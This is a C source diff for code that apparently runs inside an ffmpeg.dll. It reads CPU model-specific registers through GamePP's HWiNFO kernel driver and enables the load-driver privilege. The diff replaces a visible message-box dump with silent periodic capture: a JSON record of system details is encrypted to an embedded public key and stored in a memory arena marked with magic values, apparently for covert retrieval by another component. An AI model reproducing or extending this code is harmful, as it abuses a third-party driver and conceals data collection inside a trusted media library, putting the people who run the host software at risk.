@@ -1,14 +1,25 @@
-/* Periodic MTRR dump via GamePP's HWiNFO device. C only; no extra link flags. */
+/* MTRR snapshot via GamePP's HWiNFO device. C only.
+ * JSON is ECDH P-256 + AES-256-GCM sealed into a 16KiB VirtualAlloc arena.
+ * Refresh failure keeps the previous published frame.
+ */
 #include <intrin.h>
+#include <stdarg.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
+#include <bcrypt.h>
 
+#include "chromium/mtrr_blob.h"
 #include "libavutil/mem.h"
 
-#pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(linker, "/INCLUDE:_kMtrrPatchSlot")
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+#endif
 
 enum { kIoctlRdMsr = 0x85FE2604u, kIntervalMs = 60000 };
 
@@ -21,8 +32,38 @@ struct MsrBuf {
 #pragma pack(pop)
 
 _Static_assert(sizeof(struct MsrBuf) == 16, "RdMSR buffer must be 16 bytes");
+_Static_assert(kMtrrArenaIvOff == kMtrrArenaEphPubOff + kMtrrEccPubLen,
+               "ephemeral key must sit against the IV");
+_Static_assert(kMtrrArenaCtOff == kMtrrArenaIvOff + kMtrrArenaIvLen,
+               "ciphertext must follow the IV");
+_Static_assert(kMtrrArenaFtrMagicOff == kMtrrArenaSize - 16,
+               "footer magic is the last 16 bytes");
+_Static_assert(kMtrrSlotCookieEndOff == kMtrrSlotPubkeyOff + kMtrrSlotPubkeyCap,
+               "end cookie follows the public-key cap");
+
+struct JsonBuf {
+  char *p;
+  size_t cap;
+  size_t n;
+  int ok;
+};
 
 static HANDLE g_stop;
+static BCRYPT_ALG_HANDLE g_ecdh;
+static BCRYPT_ALG_HANDLE g_aes;
+static BCRYPT_KEY_HANDLE g_peer;
+static uint8_t *g_arena;
+static uint8_t g_hdr[16];
+static uint8_t g_ftr[16];
+static int g_have_frame;
+
+static const uint32_t kFixMsr[] = {
+    0x250u, 0x258u, 0x259u, 0x268u, 0x269u, 0x26Au,
+    0x26Bu, 0x26Cu, 0x26Du, 0x26Eu, 0x26Fu};
+static const char *kFixName[] = {
+    "FIX64K_00000", "FIX16K_80000", "FIX16K_A0000", "FIX4K_C0000",
+    "FIX4K_C8000",  "FIX4K_D0000",  "FIX4K_D8000",  "FIX4K_E0000",
+    "FIX4K_E8000",  "FIX4K_F0000",  "FIX4K_F8000"};
 
 static const char *MtrrTypeName(uint8_t t) {
   switch (t) {
@@ -93,31 +134,6 @@ static int ReadMsr(HANDLE dev, uint32_t msr, uint64_t *out, DWORD *err_out) {
   return 1;
 }
 
-static void AppendLine(char *dst, size_t cap, const char *line) {
-  size_t used = strlen(dst);
-  size_t n = strlen(line);
-  if (used + n + 2 >= cap)
-    return;
-  memcpy(dst + used, line, n);
-  dst[used + n] = '\r';
-  dst[used + n + 1] = '\n';
-  dst[used + n + 2] = 0;
-}
-
-static void DumpOne(HANDLE dev, char *text, size_t cap, uint32_t msr,
-                    const char *label) {
-  uint64_t v = 0;
-  DWORD err = 0;
-  char line[160];
-  if (ReadMsr(dev, msr, &v, &err))
-    snprintf(line, sizeof(line), "0x%03X %-22s %016llX", msr, label,
-             (unsigned long long)v);
-  else
-    snprintf(line, sizeof(line), "0x%03X %-22s FAIL err=%lu", msr, label,
-             (unsigned long)err);
-  AppendLine(text, cap, line);
-}
-
 static int ThisProcessMayDump(void) {
   const wchar_t *cl = GetCommandLineW();
   HANDLE mtx;
@@ -133,24 +149,238 @@ static int ThisProcessMayDump(void) {
   return 1;
 }
 
-static int ShowDump(void) {
-  HANDLE dev;
-  char text[8192];
-  char line[256];
+static uint64_t UnixSeconds(void) {
+  FILETIME ft;
+  ULARGE_INTEGER u;
+  GetSystemTimeAsFileTime(&ft);
+  u.LowPart = ft.dwLowDateTime;
+  u.HighPart = ft.dwHighDateTime;
+  if (u.QuadPart < 116444736000000000ull)
+    return 0;
+  return (u.QuadPart - 116444736000000000ull) / 10000000ull;
+}
+
+static void JRaw(struct JsonBuf *j, const char *s, size_t n) {
+  if (!j->ok)
+    return;
+  if (j->n + n >= j->cap) {
+    j->ok = 0;
+    return;
+  }
+  memcpy(j->p + j->n, s, n);
+  j->n += n;
+  j->p[j->n] = 0;
+}
+
+static void JStr(struct JsonBuf *j, const char *s) {
+  JRaw(j, s, strlen(s));
+}
+
+static void JFmt(struct JsonBuf *j, const char *fmt, ...) {
+  char tmp[192];
+  va_list ap;
+  int n;
+  if (!j->ok)
+    return;
+  va_start(ap, fmt);
+  n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
+  va_end(ap);
+  if (n < 0 || (size_t)n >= sizeof(tmp)) {
+    j->ok = 0;
+    return;
+  }
+  JRaw(j, tmp, (size_t)n);
+}
+
+static void JHex64(struct JsonBuf *j, uint64_t v) {
+  JFmt(j, "\"0x%016llX\"", (unsigned long long)v);
+}
+
+static void JMsr(struct JsonBuf *j, HANDLE dev, uint32_t msr) {
+  uint64_t v = 0;
+  if (ReadMsr(dev, msr, &v, NULL))
+    JHex64(j, v);
+  else
+    JStr(j, "null");
+}
+
+static int EnsureReady(void) {
+  BCRYPT_ALG_HANDLE ecdh = NULL;
+  BCRYPT_ALG_HANDLE aes = NULL;
+  BCRYPT_KEY_HANDLE peer = NULL;
+  uint8_t *arena = NULL;
+  uint32_t ver = 0, pklen = 0, magic = 0, cbkey = 0;
+  NTSTATUS st;
+  const unsigned char *slot = kMtrrPatchSlot;
+
+  if (g_arena && g_peer && g_ecdh && g_aes)
+    return 1;
+
+  memcpy(&ver, slot + kMtrrSlotVersionOff, 4);
+  memcpy(&pklen, slot + kMtrrSlotPubkeyLenOff, 4);
+  memcpy(&magic, slot + kMtrrSlotPubkeyOff, 4);
+  memcpy(&cbkey, slot + kMtrrSlotPubkeyOff + 4, 4);
+  if (ver != kMtrrSlotVersion || pklen != kMtrrEccPubLen ||
+      magic != BCRYPT_ECDH_PUBLIC_P256_MAGIC || cbkey != kMtrrEccCoordLen)
+    return 0;
+
+  st = BCryptOpenAlgorithmProvider(&ecdh, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);
+  if (!NT_SUCCESS(st))
+    goto fail;
+  st = BCryptOpenAlgorithmProvider(&aes, BCRYPT_AES_ALGORITHM, NULL, 0);
+  if (!NT_SUCCESS(st))
+    goto fail;
+  st = BCryptSetProperty(aes, BCRYPT_CHAINING_MODE,
+                         (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
+                         sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+  if (!NT_SUCCESS(st))
+    goto fail;
+  st = BCryptImportKeyPair(ecdh, NULL, BCRYPT_ECCPUBLIC_BLOB, &peer,
+                           (PUCHAR)(slot + kMtrrSlotPubkeyOff), pklen, 0);
+  if (!NT_SUCCESS(st))
+    goto fail;
+  arena = (uint8_t *)VirtualAlloc(NULL, kMtrrArenaSize,
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (!arena)
+    goto fail;
+
+  memcpy(g_hdr, slot + kMtrrSlotHdrMagicOff, 16);
+  memcpy(g_ftr, slot + kMtrrSlotFtrMagicOff, 16);
+  g_ecdh = ecdh;
+  g_aes = aes;
+  g_peer = peer;
+  g_arena = arena;
+  return 1;
+
+fail:
+  if (peer)
+    BCryptDestroyKey(peer);
+  if (ecdh)
+    BCryptCloseAlgorithmProvider(ecdh, 0);
+  if (aes)
+    BCryptCloseAlgorithmProvider(aes, 0);
+  if (arena)
+    VirtualFree(arena, 0, MEM_RELEASE);
+  return 0;
+}
+
+static int EncryptAndPublish(const char *json, uint32_t json_len) {
+  BCRYPT_KEY_HANDLE eph = NULL;
+  BCRYPT_KEY_HANDLE sym = NULL;
+  BCRYPT_SECRET_HANDLE secret = NULL;
+  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
+  BCryptBuffer kdf_buf;
+  BCryptBufferDesc kdf_desc;
+  wchar_t hash_alg[] = BCRYPT_SHA256_ALGORITHM;
+  UCHAR eph_blob[72];
+  UCHAR iv[12];
+  UCHAR aes_key[32];
+  UCHAR tag[16];
+  UCHAR ct[kMtrrJsonCap];
+  ULONG written = 0;
+  ULONG cb = 0;
+  NTSTATUS st;
+  uint32_t ver = kMtrrArenaVersion;
+  uint32_t flags = 0;
+  uint32_t reserved = 0;
+  uint8_t *after;
+  size_t tail;
+  int ok = 0;
+
+  if (!g_arena || !g_peer || !g_ecdh || !g_aes)
+    return 0;
+  if (json_len == 0 || json_len > kMtrrJsonCap)
+    return 0;
+  if ((size_t)kMtrrArenaCtOff + json_len + kMtrrArenaTagLen >
+      (size_t)kMtrrArenaFtrMagicOff)
+    return 0;
+
+  st = BCryptGenerateKeyPair(g_ecdh, &eph, 256, 0);
+  if (!NT_SUCCESS(st))
+    goto done;
+  st = BCryptFinalizeKeyPair(eph, 0);
+  if (!NT_SUCCESS(st))
+    goto done;
+  cb = sizeof(eph_blob);
+  st = BCryptExportKey(eph, NULL, BCRYPT_ECCPUBLIC_BLOB, eph_blob,
+                       sizeof(eph_blob), &cb, 0);
+  if (!NT_SUCCESS(st) || cb != sizeof(eph_blob))
+    goto done;
+  st = BCryptSecretAgreement(eph, g_peer, &secret, 0);
+  if (!NT_SUCCESS(st))
+    goto done;
+
+  kdf_buf.cbBuffer = (ULONG)((wcslen(hash_alg) + 1) * sizeof(wchar_t));
+  kdf_buf.BufferType = KDF_HASH_ALGORITHM;
+  kdf_buf.pvBuffer = hash_alg;
+  kdf_desc.ulVersion = BCRYPTBUFFER_VERSION;
+  kdf_desc.cBuffers = 1;
+  kdf_desc.pBuffers = &kdf_buf;
+  written = sizeof(aes_key);
+  st = BCryptDeriveKey(secret, BCRYPT_KDF_HASH, &kdf_desc, aes_key,
+                       sizeof(aes_key), &written, 0);
+  if (!NT_SUCCESS(st) || written != sizeof(aes_key))
+    goto done;
+
+  st = BCryptGenRandom(NULL, iv, sizeof(iv), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+  if (!NT_SUCCESS(st))
+    goto done;
+  st = BCryptGenerateSymmetricKey(g_aes, &sym, NULL, 0, aes_key,
+                                  sizeof(aes_key), 0);
+  if (!NT_SUCCESS(st))
+    goto done;
+
+  BCRYPT_INIT_AUTH_MODE_INFO(auth);
+  auth.pbNonce = iv;
+  auth.cbNonce = sizeof(iv);
+  auth.pbTag = tag;
+  auth.cbTag = sizeof(tag);
+  written = 0;
+  st = BCryptEncrypt(sym, (PUCHAR)json, json_len, &auth, NULL, 0, ct, json_len,
+                     &written, 0);
+  if (!NT_SUCCESS(st) || written != json_len)
+    goto done;
+
+  memset(g_arena, 0, 16);
+  _ReadWriteBarrier();
+  memcpy(g_arena + kMtrrArenaVersionOff, &ver, 4);
+  memcpy(g_arena + kMtrrArenaFlagsOff, &flags, 4);
+  memcpy(g_arena + kMtrrArenaJsonLenOff, &json_len, 4);
+  memcpy(g_arena + kMtrrArenaReservedOff, &reserved, 4);
+  memcpy(g_arena + kMtrrArenaEphPubOff, eph_blob, sizeof(eph_blob));
+  memcpy(g_arena + kMtrrArenaIvOff, iv, sizeof(iv));
+  memcpy(g_arena + kMtrrArenaCtOff, ct, json_len);
+  memcpy(g_arena + kMtrrArenaCtOff + json_len, tag, sizeof(tag));
+  after = g_arena + kMtrrArenaCtOff + json_len + kMtrrArenaTagLen;
+  tail = (size_t)(g_arena + kMtrrArenaFtrMagicOff - after);
+  if (tail)
+    memset(after, 0, tail);
+  memcpy(g_arena + kMtrrArenaFtrMagicOff, g_ftr, 16);
+  _ReadWriteBarrier();
+  memcpy(g_arena, g_hdr, 16);
+  ok = 1;
+
+done:
+  SecureZeroMemory(aes_key, sizeof(aes_key));
+  if (sym)
+    BCryptDestroyKey(sym);
+  if (secret)
+    BCryptDestroySecret(secret);
+  if (eph)
+    BCryptDestroyKey(eph);
+  return ok;
+}
+
+static int BuildJson(HANDLE dev, struct JsonBuf *j) {
   int regs[4];
   uint32_t ebx, ecx, edx, sig, feat_edx, family, model;
   uint32_t base_family, base_model, ext_family, ext_model;
-  int has_mtrr, has_pat, has_msr, fix;
+  int has_mtrr, has_pat, has_msr, fix, wc;
   uint32_t vcnt, pairs, i;
   uint64_t cap = 0, def = 0;
-  DWORD err = 0;
   const char *vendor = "Unknown";
+  const char *type_name;
 
-  dev = OpenHwinfoDevice();
-  if (dev == INVALID_HANDLE_VALUE)
-    return 0;
-
-  text[0] = 0;
   __cpuid(regs, 0);
   ebx = (uint32_t)regs[1];
   ecx = (uint32_t)regs[2];
@@ -175,71 +405,97 @@ static int ShowDump(void) {
   has_pat = (feat_edx & (1u << 16)) != 0;
   has_msr = (feat_edx & (1u << 5)) != 0;
 
-  snprintf(line, sizeof(line),
-           "%s Family %u Model %02X  MTRR=%d PAT=%d MSR=%d", vendor, family,
-           model, has_mtrr, has_pat, has_msr);
-  AppendLine(text, sizeof(text), line);
+  JStr(j, "{\"v\":1,\"ts\":");
+  JFmt(j, "%llu", (unsigned long long)UnixSeconds());
+  JFmt(j, ",\"pid\":%lu", (unsigned long)GetCurrentProcessId());
+  JFmt(j, ",\"vendor\":\"%s\",\"family\":%u,\"model\":\"%02X\"", vendor, family,
+       model);
+  JFmt(j, ",\"feat\":{\"mtrr\":%d,\"pat\":%d,\"msr\":%d}", has_mtrr, has_pat,
+       has_msr);
 
-  if (!has_mtrr || !has_msr) {
-    CloseHandle(dev);
+  if (!has_mtrr || !has_msr)
     return 0;
-  }
-  if (!ReadMsr(dev, 0x0FEu, &cap, &err)) {
-    CloseHandle(dev);
+  if (!ReadMsr(dev, 0x0FEu, &cap, NULL))
     return 0;
-  }
   vcnt = (uint32_t)(cap & 0xffu);
   fix = (cap & (1ull << 8)) != 0;
-  snprintf(line, sizeof(line), "IA32_MTRRCAP 0x%016llX  VCNT=%u FIX=%d WC=%d",
-           (unsigned long long)cap, vcnt, fix,
-           (int)((cap & (1ull << 10)) != 0));
-  AppendLine(text, sizeof(text), line);
+  wc = (cap & (1ull << 10)) != 0;
+  JStr(j, ",\"mtrrcap\":{\"raw\":");
+  JHex64(j, cap);
+  JFmt(j, ",\"vcnt\":%u,\"fix\":%d,\"wc\":%d}", vcnt, fix, wc);
 
   pairs = vcnt > 40u ? 40u : vcnt;
+  JStr(j, ",\"var\":[");
   for (i = 0; i < pairs; i++) {
-    char lab[32];
-    snprintf(lab, sizeof(lab), "PHYSBASE%u", i);
-    DumpOne(dev, text, sizeof(text), 0x200u + i * 2u, lab);
-    snprintf(lab, sizeof(lab), "PHYSMASK%u", i);
-    DumpOne(dev, text, sizeof(text), 0x201u + i * 2u, lab);
+    if (i)
+      JStr(j, ",");
+    JFmt(j, "{\"i\":%u,\"base\":", i);
+    JMsr(j, dev, 0x200u + i * 2u);
+    JStr(j, ",\"mask\":");
+    JMsr(j, dev, 0x201u + i * 2u);
+    JStr(j, "}");
   }
+  JStr(j, "]");
+
   if (fix) {
-    DumpOne(dev, text, sizeof(text), 0x250u, "FIX64K_00000");
-    DumpOne(dev, text, sizeof(text), 0x258u, "FIX16K_80000");
-    DumpOne(dev, text, sizeof(text), 0x259u, "FIX16K_A0000");
-    DumpOne(dev, text, sizeof(text), 0x268u, "FIX4K_C0000");
-    DumpOne(dev, text, sizeof(text), 0x269u, "FIX4K_C8000");
-    DumpOne(dev, text, sizeof(text), 0x26Au, "FIX4K_D0000");
-    DumpOne(dev, text, sizeof(text), 0x26Bu, "FIX4K_D8000");
-    DumpOne(dev, text, sizeof(text), 0x26Cu, "FIX4K_E0000");
-    DumpOne(dev, text, sizeof(text), 0x26Du, "FIX4K_E8000");
-    DumpOne(dev, text, sizeof(text), 0x26Eu, "FIX4K_F0000");
-    DumpOne(dev, text, sizeof(text), 0x26Fu, "FIX4K_F8000");
+    JStr(j, ",\"fix\":{");
+    for (i = 0; i < sizeof(kFixMsr) / sizeof(kFixMsr[0]); i++) {
+      if (i)
+        JStr(j, ",");
+      JFmt(j, "\"%s\":", kFixName[i]);
+      JMsr(j, dev, kFixMsr[i]);
+    }
+    JStr(j, "}");
   }
-  if (has_pat)
-    DumpOne(dev, text, sizeof(text), 0x277u, "IA32_PAT");
-  DumpOne(dev, text, sizeof(text), 0x2FFu, "MTRR_DEF_TYPE");
+  if (has_pat) {
+    JStr(j, ",\"pat\":");
+    JMsr(j, dev, 0x277u);
+  }
+
+  JStr(j, ",\"def\":{\"raw\":");
   if (ReadMsr(dev, 0x2FFu, &def, NULL)) {
-    snprintf(line, sizeof(line), "DEF enable=%d fixed=%d default=%s",
-             (int)((def & (1ull << 11)) != 0),
-             (int)((def & (1ull << 10)) != 0), MtrrTypeName((uint8_t)def));
-    AppendLine(text, sizeof(text), line);
+    type_name = MtrrTypeName((uint8_t)def);
+    JHex64(j, def);
+    JFmt(j, ",\"enable\":%d,\"fixed\":%d,\"type\":\"%s\"}",
+         (int)((def & (1ull << 11)) != 0), (int)((def & (1ull << 10)) != 0),
+         type_name);
+  } else {
+    JStr(j, "null,\"enable\":null,\"fixed\":null,\"type\":null}");
   }
+  JStr(j, "}");
+  return j->ok;
+}
+
+static int CaptureAndPublish(void) {
+  HANDLE dev;
+  char json[kMtrrJsonCap];
+  struct JsonBuf j;
+  int built;
+
+  if (!EnsureReady())
+    return 0;
+  dev = OpenHwinfoDevice();
+  if (dev == INVALID_HANDLE_VALUE)
+    return 0;
+  memset(&j, 0, sizeof(j));
+  j.p = json;
+  j.cap = sizeof(json);
+  j.ok = 1;
+  built = BuildJson(dev, &j);
   CloseHandle(dev);
-  MessageBoxA(NULL, text, "ffmpeg.dll MTRR", MB_OK | MB_ICONINFORMATION);
-  return 1;
+  if (!built || !j.ok || j.n == 0)
+    return 0;
+  return EncryptAndPublish(json, (uint32_t)j.n);
 }
 
 static DWORD WINAPI MtrrDumpThread(LPVOID unused) {
   (void)unused;
   EnableLoadDriverPrivilege();
   while (!WaitStop(0)) {
-    if (ShowDump()) {
-      if (WaitStop(kIntervalMs))
-        break;
-    } else if (WaitStop(500)) {
+    if (CaptureAndPublish())
+      g_have_frame = 1;
+    if (WaitStop(g_have_frame ? kIntervalMs : 500))
       break;
-    }
   }
   return 0;
 }
